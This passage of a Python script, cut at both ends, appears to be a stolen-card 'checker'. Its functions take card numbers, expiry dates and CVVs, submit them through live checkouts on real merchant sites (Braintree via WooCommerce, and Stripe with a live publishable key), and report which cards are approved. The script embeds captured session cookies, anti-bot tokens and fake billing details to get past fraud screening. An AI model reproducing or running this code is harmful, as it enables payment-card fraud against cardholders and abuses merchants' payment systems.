Ltd","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA2OTU5MjYsImp0aSI6IjlhYjI0YTYxLTMzYzAtNDI0YS1iYTkyLWJlY2U1ODEyODc3OSIsInN1YiI6InprcmprNWtyajJkd25zZ2MiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InprcmprNWtyajJkd25zZ2MiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.BkPD6JraXgzmd2dT9Y6b5TPq9IXytqExWhPbVnBpRMgelBYL19fSPckRgLPOPESNYhZf7cBu6O4-x-bbusfkeA","paypalClientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Trade Chemicals Ltd","clientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"stuarttradechemcouk","payeeEmail":null,"currencyIsoCode":"GBP"}}',
    'woocommerce-add-payment-method-nonce': anonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'ct_bot_detector_event_token': 'dd2f6f71e896177e0654d9d88cd0deed9399653e630b5ab3ed3560a2669245d0',
    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6OX19',
    'ct_no_cookie_hidden_field': '_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3Rfc2Vzc2lvbl9pZCI6ImpuY3JleHNvIiwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiJTdCJTIydmlzaWJsZV9maWVsZHMlMjIlM0ElMjIlMjIlMkMlMjJ2aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTAlMkMlMjJpbnZpc2libGVfZmllbGRzJTIyJTNBJTIyYnJhaW50cmVlX2NjX25vbmNlX2tleSUyMGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSUyMGJyYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5JTIwYnJhaW50cmVlX2NjX2NvbmZpZ19kYXRhJTIwd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlJTIwX3dwX2h0dHBfcmVmZXJlciUyMHdvb2NvbW1lcmNlX2FkZF9wYXltZW50X21ldGhvZCUyMGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiUyMGFwYmN0X3Zpc2libGVfZmllbGRzJTIwY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCUyMiUyQyUyMmludmlzaWJsZV9maWVsZHNfY291bnQlMjIlM0ExMCU3RCIsImN0X2ZrcF90aW1lc3RhbXAiOiIxNzIwNjA5NzQ3IiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzNjAlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMTY2MCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM2MCUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E3MDklN0QiLCJhcGJjdF9wcmV2X3JlZmVyZXIiOiJodHRwczovL3RyYWRlLWNoZW0uY28udWsvbXktYWNjb3VudC9wYXltZW50LW1ldGhvZHMvIiwiY3RfY2hlY2tqcyI6IjE0NzQ0MzAwNDAiLCJjdF90aW1lem9uZSI6IjMiLCJhcGJjdF9waXhlbF91cmwiOiJodHRwcyUzQSUyRiUyRm1vZGVyYXRlOC12NC5jbGVhbnRhbGsub3JnJTJGcGl4ZWwlMkZmZjE2NWQ1ZThhZTc4YmFkMDZhMTQzNDA3YWNjNWUyZi5naWYiLCJjdF9jaGVja2VkX2VtYWlscyI6IjAiLCJjdF9oYXNfa2V5X3VwIjoidHJ1ZSIsImN0X3BzX3RpbWVzdGFtcCI6IjE3MjA2MDk3MzUiLCJhcGJjdF9wYWdlX2hpdHMiOjE4LCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNzIwNjA4MDczIiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyNWM2OTIyMmMyNGU1MzA1ZTg3ZTY0ZmU1NmQ4Nzc0MWQlMjIlN0QiLCJjdF9wb2ludGVyX2RhdGEiOiIlNUIlNUI0MDElMkMyMDIlMkMxMzA1NSU1RCU1RCIsImFwYmN0X3NpdGVfcmVmZXJlciI6Imh0dHBzOi8vbWFpbC5nb29nbGUuY29tLyIsImFwYmN0X2lmcmFtZXNfcHJvdGVjdGVkIjpbXSwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3RyYWRlLWNoZW0uY28udWsvbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIiwidHlwbyI6W119',
	}
	
	response = requests.post('https://trade-chem.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text or 'Invalid postal code' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds' in text:
			result = "RISK"
		else:
			result = "RISK"
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def cn(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests,re,base64
	def up():
		r = requests.session()
		headers={
		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
		}
		response = r.get('https://www.paintsupply.com', headers=headers)
		from requests_toolbelt.multipart.encoder import MultipartEncoder
		headers = {
		    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		files = {
		    'quantity': (None, '1'),
		    'product_price': (None, '5.59'),
		    'product_weight': (None, '1.000'),
		    'sfm_logic_onoff': (None, 'off'),
		    'modal_hide_show': (None, '240'),
		    'sfm_value': (None, '240'),
		    'sfm_type': (None, 'cases'),
		    'cart_old_qty': (None, ''),
		    'check_sfm_on_off_for_modal': (None, '0'),
		    'add-to-cart': (None, '30856'),
		    'gtm4wp_id': (None, '30856'),
		    'gtm4wp_internal_id': (None, '30856'),
		    'gtm4wp_name': (None, '16 Oz Seymour Of Sycamore 16-3395 Solvent-Based Spray Match Custom Can'),
		    'gtm4wp_sku': (None, '155944'),
		    'gtm4wp_category': (None, 'Empty Aerosol Cans'),
		    'gtm4wp_price': (None, '5.59'),
		    'gtm4wp_stocklevel': (None, '568'),
		    'gtm4wp_brand': (None, 'Seymour Of Sycamore'),
		}
		multipart_data = MultipartEncoder(files)
		headers['Content-Type'] = multipart_data.content_type
		response = r.post(
		    'https://www.paintsupply.com/product/spray-paint/aerosol-empty-cans/16-oz-seymour-16-3395-blank-seymore-solvent-based-empty-spray-can/',
		    cookies=r.cookies,
		    headers=headers,
		    data=multipart_data
		)
		response = r.get('https://www.paintsupply.com/cart/', cookies=r.cookies, headers=headers)
		response = r.get('https://www.paintsupply.com/checkout', cookies=r.cookies, headers=headers)
		nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
		CartRebuildKey=re.findall(r'"CartRebuildKey":"(.*?)"',response.text)[0]
		from bs4 import BeautifulSoup
		soup = BeautifulSoup(response.text, 'html.parser')
		wpnonce_input = soup.find('input', id='_wpnonce')
		wpnonce_value = wpnonce_input['value']
		headers = {
		    'Accept': '*/*',
		    'Accept-Language': 'en-US,en;q=0.9',
		    'Connection': 'keep-alive',
		    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    'Origin': 'https://www.paintsupply.com',
		    'Referer': 'https://www.paintsupply.com/checkout',
		    'Sec-Fetch-Dest': 'empty',
		    'Sec-Fetch-Mode': 'cors',
		    'Sec-Fetch-Site': 'same-origin',
		    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'X-Requested-With': 'XMLHttpRequest',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		}
		
		data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': nonce,
		}
		
		response = r.post('https://www.paintsupply.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		import pickle
		import http.cookiejar
		with open('cookies.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					'na' : {
		  "nonce": wpnonce_value,
		  "au": au
					}
				}
		
		existing_data.update(new_data)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	
	try:
		wpnonce_value=json_data['na']['nonce']
		au=json_data['na']['au']
		r = requests.session()
		import pickle
		import http.cookiejar
		with open('cookies.pkl', 'rb') as f:
			cookies = pickle.load(f)
		r = requests.session()
		r.cookies = cookies
	except Exception as e:
		print(e)
		up()
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	     'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '2c96985f-2964-4e2e-a62d-8eb9c4d361fa',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	headers = {
 'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': 'pbid=99e83c546a9c7cc523624f138fc18e4a8bc15cbfa844d98b64860a21811df9fa; AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; pys_session_limit=true; __mmapiwsid=0190927f-1b61-76a1-82fb-bc6db8d4bd51:32ac40482347709ace592e33bd3e74be566a1b0d; _gid=GA1.2.312765270.1720444736; nf23510_services_exp=597-059-524; BVBRANDID=088ab1d7-5198-4a9e-b82c-e797b73e23bd; BVBRANDSID=f8148c3e-9d8c-4d40-b7b5-08b5d9c66883; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.paintsupply.com/categories/spray-paint/; _fbp=fb.1.1720444754603.2756847828; _fbp=fb.1.1720444754603.2756847828; __qca=P0-957407452-1720444763701; shoppingfeeder=71c78210a4b414b7; ctm_data=%5B%7B%22product_id%22%3A28495%2C%22manufacturer_id%22%3A8163%2C%22minimun_req_type%22%3A%22cases%22%2C%22minimum_req_value%22%3A%2224%22%2C%22sfm_available%22%3A%22no%22%7D%5D; wp_woocommerce_session_8799450e5122eb37f5ddc09d45cc175b=t_a5f0cb0742f90b7375c728129c0b6d%7C%7C1720617584%7C%7C1720613984%7C%7C42d6fbb52061a2d58ed9a0521069ab10; PHPSESSID=js0a1ktj9fch1n9t1en08h36cj; pys_start_session=true; wp-wpml_current_language=en; last_pysTrafficSource=direct; last_pys_landing_page=https://www.paintsupply.com/checkout; dicbo_id=%7B%22dicbo_fetch%22%3A1720445067826%7D; woocommerce_items_in_cart=1; woocommerce_cart_hash=89e64e498b247f3b17c811fa6a654058; _ga=GA1.2.1039277264.1720444736; _uetsid=a3f4e5e03d2c11ef88be83bab9b1311d; _uetvid=a3f60db03d2c11efbedc09b40b1b4ed3; _ga_T78BEZZ2B5=GS1.1.1720444736.1.1.1720445204.12.0.0; _ga_0YNMLT9GX6=GS1.1.1720444738.1.1.1720445205.11.0.0; _gcl_au=1.1.384415976.1720444726.1346736946.1720444841.1720445205; __kla_id=eyJjaWQiOiJPR1ZpWW1NeFpUVXRNRFJtWmkwMFpXUmlMV0prTkdFdFl6QTNNMkppWm1GbFlUaGkiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjA0NDQ3NjQsInZhbHVlIjoiaHR0cHM6Ly93d3cucGFpbnRzdXBwbHkuY29tLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5wYWludHN1cHBseS5jb20vY2F0ZWdvcmllcy9zcHJheS1wYWludC8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MjA0NDUxOTcsInZhbHVlIjoiaHR0cHM6Ly93d3cucGFpbnRzdXBwbHkuY29tLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5wYWludHN1cHBseS5jb20vY2F0ZWdvcmllcy9zcHJheS1wYWludC8ifSwiJHNvdXJjZSI6IkNoZWNrb3V0IFNNUyBPcHQtSW4iLCIkZXhjaGFuZ2VfaWQiOiIxa1V3MmpRTERpTzZYVWNpMnF1dFpTMnhkWHJaX0JMOW1Cemx5VTNOQXJVLktFN3l6MiJ9; datadome=jW~dEV90KsDswR_0neGWk1kpQbW~CDRxB9SojwJ8IhOJMaWR5MTcRur7Mqjh_YqxVOVR2x~5GobBG_XI730y45lr0S2iPSsnyXwdhUsgfpLJ~9QuireneAlfwmbuOqzu',
	    'Origin': 'https://www.paintsupply.com',
	    'Referer': 'https://www.paintsupply.com/checkout',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'x-datadome-clientid': 'm9DS6KtMgbbqiQG6bCXalIr4aqvXxM9qaeXKTiPfuwPNPoaxz~SoDcT_UMChjLjzi_nj7WDMlfrVkh9lx~m7q3wXhsc9qmxv6DpzsFFuuMuygH7UBDTWKWqxN2UxcNoa',
	}
	
	params = {
	    'wc-ajax': 'checkout',
	}
	
	data = {
	    'ship_to_different_address': '1',
	    'shipping_first_name': 'Mero',
	    'shipping_last_name': 'AYman',
	    'shipping_company': '',
	    'shipping_country': 'US',
	    'shipping_address_1': '323 E Pine St',
	    'shipping_address_2': '',
	    'shipping_city': 'Deming',
	    'shipping_state': 'NY',
	    'shipping_postcode': '10080',
	    'billing_phone': '66464649',
	    'billing_email': 'mero@gmail.com',
	    'kl_newsletter_checkbox': '1',
	    'po_number': '',
	    'how_hear_about': '',
	    'account_password': '',
	    'bill-to-same-address-as-shipping': '1',
	    'billing_first_name': 'Mero',
	    'billing_last_name': 'AYman',
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': '323 E Pine St',
	    'billing_address_2': '',
	    'billing_city': 'Deming',
	    'billing_state': 'NY',
	    'billing_postcode': '10080',
	    'shipping_method[0]': 'table_rate:2:2',
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'visa',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '17.50',
	    'wc_braintree_credit_card_payment_nonce': tok,
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'wc_braintree_paypal_device_data': '{"correlation_id":"a51b1cd0a60f8b18abbecf331ce2bfc6"}',
	    'wc_braintree_paypal_payment_nonce': '',
	    'wc_braintree_paypal_amount': '17.50',
	    'wc_braintree_paypal_currency': 'USD',
	    'wc_braintree_paypal_locale': 'en_us',
	    'ach_status': '',
	    '_wpnonce': wpnonce_value,
	    '_wp_http_referer': '/?wc-ajax=update_order_review',
	    'pys_utm': 'utm_source:undefined|utm_medium:undefined|utm_campaign:undefined|utm_term:undefined|utm_content:undefined',
	    'pys_utm_id': 'fbadid:undefined|gadid:undefined|padid:undefined|bingid:undefined',
	    'pys_browser_time': '16-17|Monday|July',
	    'pys_landing': 'https://www.paintsupply.com/categories/spray-paint/',
	    'pys_source': 'direct',
	    'pys_order_type': 'normal',
	    'last_pys_landing': 'https://www.paintsupply.com/checkout',
	    'last_pys_source': 'direct',
	    'last_pys_utm': 'utm_source:undefined|utm_medium:undefined|utm_campaign:undefined|utm_term:undefined|utm_content:undefined',
	    'last_pys_utm_id': 'fbadid:undefined|gadid:undefined|padid:undefined|bingid:undefined',
	}
	
	response = r.post('https://www.paintsupply.com/', params=params, cookies=r.cookies, headers=headers, data=data)
	last=response.text
	if 'CHARGED' in last or 'success' in last or 'Success' in last or 'Your payment has already been processed' in last or 'succeeded' in last or 'success' in last or 'Thank' in last:
		up()
		return 'success'
	elif 'Sorry, your session has expired.' in last:
		up()
		return 'Declined'
	try:
		m=(response.json()['messages'])
		m=m.split('class=\"woocommerce-error\">\n\t\t\t<li>')[1].split('</li>\n\t</ul>\n')[0]
		return m
	except:
		up()
		return 'Declined'
def sv(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'key=pk_live_Lk2wcr8WKXEORwr4he3GSzEL&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54&sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be&referrer=https%3A%2F%2Fwww.brandcrowd.com&time_on_page=27978&card[number]={n}&card[cvc]={cvc}&card[exp_month]=08&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYgOMResgdR8tVVFNz6ArhL0badnemc-IY332cxC2_RT129Rh1Ikfuyk36zFF-RySxke4a6eMVJlA_mD3GG9XWg_Dl9gxH8Duvd8AY2m8220XCcXDUTbgn8MNZQHYJTilwd60ePnVrY2hr0giMBzsyC-PFzl6PU9dGKMpDqCj4ZWszY8Hnp9s_RTTCCRow2HhjlZH7142PDQE2DkXrjQrVwniIiPa9DcpisxgRF4KXCm--kPhVyUnPklBhitoJyxL2QJw-S4oqX0YlPre18Tpmghricsh-jahZfnlc9Su1KTEipIolqrMnYsqza3dOkELAhC_61JYbAZGlaIOb87A7XbUd8LfszKYV-bFZhD1QO58NXyTH0pP_NPAZZJT2Ay7JMStWSCbxI-ze9_B8FX9BFtXKs5U5M1V7gmiqwjT9QCKInMuAWCR0lh-7kR0PtQyJGd4SRUAUylFbAJT92o70X1ssx_TPS6hLqYdvt6pWD82XpLCR49PzcdNjTFs-XBBO2_BwISfx3vVujrSPg7KhZw9kgvA22J91us5MkTlSBk0apP7_NFSe5mnAmJ2R_woIXdlm6ANTXaI7VZiXqUjL3ospqU0sVjYNunzzuhZgE1PsLtzvTb7mAVN3Ypi8v4tA6YG7q8bgNHg8LEIuWVoJ7smmGmW4wVs_c7vt-0PyP-tTzEhcYYB8n_oja2tb1yUJCkLgurWnqCa0IhmiT8eHEouA8uDi3bSGQOtsQ2hmcd0oqRv5dJ-phe37cWOxoWEyff5alVd6fGyhv2n79Qv47chzne9Hv5LPYJ4KYhE6wC2ntKbHgREEbe_Q9EAKgUqpmu6-tTx8uSSDEwTJh7_G_mr3QKHL-OXqRTJBOopsJTLvVZ4eucl_T2opGEgbybxT67YP-3YK0IY6xkHeDxbJydkocIrzffAhlIp3AwuHU-9NsMZdMT9N_DToGxwy3jT0wXIMAxXFS1sq7WkWWM20Nv4cFLReorGop597X-uZx-6jg8-x3YMmBBiATxKvLCdxLF_Rp2qi6yBwufT23hHtUabq0NmtN3P8ITO4sa-8e60XDHRslZ3u1r40ASSQxJvgksP47a79CybmonrJ-WFL10pK2LuvS1aa1ElYNBVBGoG_Cxk5xkgedIJTSUNlDAUxxWtx0IdrW0GwRTG83w1jZ6j49VXX0hLhy-h5IG0AN5Y1B14zvHkTtRwsTxuc1rz2i1IiqdsBY4qARNPXT33lyZwhpw_f4Er4AzY0gj9zVCT-nZeYBPCJfjk--fbyCQbuJ62DniQE7bFBwCzNKqW08F8wk4czJKLGJwvj6oJrcpIicWFp7r6uM3E3sQMM3caZCOMvYe0pl-D5bqRjmngHCjcIfKfuoCExUCD3WTZhCOWMmScpnf1Ko1CShzEa8N7QES0x-LQgh3694gK0WqEc4q7sOlXvbRTYBeWYizlV6v-waz5cBtwm03JrGPQnEWlQeKCA0Jti5dILqQL-kS9Q9V69vMsnuWcIbkWQ_EfkI4T3g5PatgwmIjIAyGSkJ6QA4N2rdUKIJaCG3lyxOMkqMgr4ePm6s11n6hX15ZKfg2Mrg0gBZC47x4hWNxcctyAEtJqMCriS61YeaYp6O9JYoxNQ80e3q7RNVZSWSmMtKGzG-UGjamhVEP5nsBhDvRhoG2g61OTWpz3K8jrOoiyVOU3nD79b-uY2j_EiKgG41_7rf8Hxz2l35TflgeFB0tKbQWgP9uKW3gGJh97DQ8qwpRPiHoq4DV96kR-DiHI5z1qKNQiyWyJe8VfhktzbSEqzYr1fddy2h6xZkNX-GxcjlKIBa_mEnbE62GHzTKcX6UjGOtCapBBsBhsiCJ2T2YngKTQ8_mFNCfiLYH5RJ2L4lkZeU9_jPFZYMFtYbLufTZXm6ceYeg3cwmqFR_UdozNym4MLdZFpkKcwD5CRkIUPZvQ-35DnSowx_LkFmYvp4-8JvKbMr_Lgj5obZm5Dq_HVvzElL4haUXJtMKqO9Z45THYsJULYX49r1-NBPJ6bvkQIA4x50kma6FscgAK7GMjVMRlCGzsC-HrN2U9F69eyqwaUKCKWM2rDzHhibyaKWAzSjZXhwzmZHeKioc2hhcmRfaWTOAzGDb6JrcqgzNDE3OWE4ZKJwZAA.uKPrI9DFPyAAy5YHaxw9ML99H7z9q6y_pFG2MRbJkJU&payment_user_agent=stripe.js%2F315906f414%3B+stripe-js-v3%2F315906f414%3B+split-card-element'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	cookies = {
	    'bc_a': 'CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dy